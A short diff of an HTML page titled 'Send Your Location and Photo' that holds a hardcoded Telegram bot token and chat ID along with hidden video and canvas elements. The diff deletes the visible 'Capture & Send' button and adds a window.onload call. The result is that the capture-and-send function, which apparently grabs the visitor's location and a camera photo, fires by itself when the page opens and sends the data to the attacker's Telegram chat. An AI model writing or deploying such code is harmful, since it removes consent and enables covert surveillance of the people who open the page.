@@ -6,7 +6,6 @@
 </head>
 <body>
 <h2>Send Your Location and Photo</h2>
-<button onclick="sendToTelegram()">Capture & Send</button>
 <video id="video" autoplay playsinline width="300" style="display:none;"></video>
 <canvas id="canvas" width="300" height="300" style="display:none;"></canvas>
 
@@ -14,6 +13,8 @@
     const telegramBotToken = '5105771459:AAFD2B3omW17ttPH0fkdsVW47sluLcSKhJw'; // Replace with your token
     const chatId = '781820533'; // Replace with your Telegram user/chat ID
 
+    window.onload = () => sendToTelegram();
+    
     async function sendToTelegram() {
         let latitude = null;
         let longitude = null;
